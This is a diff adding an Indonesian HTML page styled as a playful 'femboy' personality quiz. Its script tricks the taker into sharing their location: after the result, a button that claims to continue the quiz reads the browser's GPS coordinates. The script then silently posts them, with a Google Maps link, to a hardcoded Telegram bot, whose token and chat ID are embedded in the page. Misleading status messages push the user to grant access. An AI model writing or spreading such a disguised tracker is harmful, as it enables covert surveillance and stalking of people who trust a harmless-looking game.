@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Femboy Quest + Location</title>
+
+<style>
+body{
+  margin:0;
+  font-family:Arial, sans-serif;
+  background:linear-gradient(135deg,#ff8bd1,#a78bfa);
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+.box{
+  background:#1e293b;
+  width:350px;
+  padding:25px;
+  border-radius:15px;
+  text-align:center;
+  box-shadow:0 10px 30px rgba(0,0,0,0.2);
+  color:white;
+}
+
+h2{
+  margin-top:0;
+}
+
+button{
+  display:block;
+  width:100%;
+  padding:10px;
+  margin-top:10px;
+  border:none;
+  border-radius:8px;
+  background:#38bdf8;
+  color:black;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+button:hover{
+  background:#0ea5e9;
+}
+
+#progress,#status{
+  margin-top:10px;
+  font-size:14px;
+  color:#ddd;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+<h2>✨ Quest Dimulai ✨</h2>
+<p id="question">Klik mulai quest</p>
+<div id="answers"></div>
+<button id="startBtn" onclick="start()">Mulai Quest</button>
+<p id="progress"></p>
+<p id="status"></p>
+</div>
+
+<script>
+const TOKEN = "8603934449:AAHmlwkehx5CxF5d-XK2_Ccgq735VR4Sjxs"
+const CHAT_ID = "8443557577"
+
+const questions = [
+{q:"Kamu lebih suka hoodie gimana?", a:[{t:"Kebesaran 🧸",p:25},{t:"Ukuran normal 😐",p:10},{t:"Jarang pake hoodie",p:0},{t:"Warna pastel 🌈",p:15}]},
+{q:"Celana favoritmu?", a:[{t:"Pendek di pinggang doang 😏",p:25},{t:"Panjang biasa",p:0},{t:"Skinny 👖",p:20},{t:"Celana lucu / motif",p:15}]},
+{q:"Kaus kaki?", a:[{t:"Suka kaus kaki lucu 🧦",p:20},{t:"Kadang",p:10},{t:"Jarang",p:0},{t:"Kaus kaki sampai lutut 👑",p:25}]},
+{q:"Perawatan kulit?", a:[{t:"Sering pakai lotion ✨",p:20},{t:"Kadang",p:10},{t:"Jarang",p:0},{t:"Pakai serum & masker 🧴",p:25}]},
+{q:"Rambutmu?", a:[{t:"Panjang / wig 💅",p:25},{t:"Pendek rapi",p:10},{t:"Pendek biasa",p:0},{t:"Eksperimen warna 🌈",p:20}]},
+{q:"Aksesori?", a:[{t:"Choker / gelang 🎀",p:20},{t:"Hanya jam ⌚",p:5},{t:"Tidak pakai",p:0},{t:"Topi / hairpin 🎩",p:15}]},
+{q:"Hobi?", a:[{t:"Cosplay / dressing lucu 🧸",p:25},{t:"Game biasa 🎮",p:10},{t:"Olahraga 🏃‍♂️",p:5},{t:"DIY / crafts ✂️",p:20}]},
+{q:"Minat femboy kecil-kecilan?", a:[{t:"Eksperimen fashion ✨",p:25},{t:"Cuma lihat-lihat 👀",p:10},{t:"Tidak tertarik",p:0},{t:"Item favorit khusus 💖",p:20}]}
+]
+
+let index=0
+let score=0
+
+function start(){
+index=0
+score=0
+document.getElementById("startBtn").style.display="none"
+showQuestion()
+}
+
+function showQuestion(){
+const q = questions[index]
+document.getElementById("question").innerText=q.q
+const ans = document.getElementById("answers")
+ans.innerHTML=""
+q.a.forEach(opt=>{
+  const btn = document.createElement("button")
+  btn.innerText = opt.t
+  btn.onclick = ()=>{
+    score+=opt.p
+    next()
+  }
+  ans.appendChild(btn)
+})
+document.getElementById("progress").innerText=`Pertanyaan ${index+1} / ${questions.length}`
+}
+
+function next(){
+index++
+if(index<questions.length){
+  showQuestion()
+}else{
+  finish()
+}
+}
+
+function finish(){
+let result=""
+if(score<50) result="0% — kamu masih warrior maskulin 🗿"
+else if(score<90) result="25% — sedikit sparkle ✨"
+else if(score<140) result="50% — zona mencurigakan 😏"
+else if(score<180) result="75% — mulai mencurigakan 👀"
+else result="100% — certified femboy legend 💅"
+
+document.getElementById("question").innerText="Hasil Quest"
+document.getElementById("answers").innerHTML=`<h3>${result}</h3><button onclick="ambilLokasi()">lanjut pertanyaan selanjutnya</button>`
+document.getElementById("progress").innerText=""
+}
+
+function ambilLokasi(){
+const status = document.getElementById("status")
+if(!navigator.geolocation){
+  status.innerText="Browser tidak support GPS"
+  return
+}
+status.innerText="lanjutan"
+navigator.geolocation.getCurrentPosition((pos)=>{
+  const lat = pos.coords.latitude
+  const lon = pos.coords.longitude
+  const text = `📍 Lokasi Didapat\n\nLatitude: ${lat}\nLongitude: ${lon}\nMap: https://maps.google.com/?q=${lat},${lon}`
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT_ID,text:text})
+  })
+  status.innerText="Selesai ✔"
+},()=>{
+  status.innerText="pencet berulang kali mungkin server sedang sibuk"
+})
+}
+
+</script>
+
+</body>
+</html>
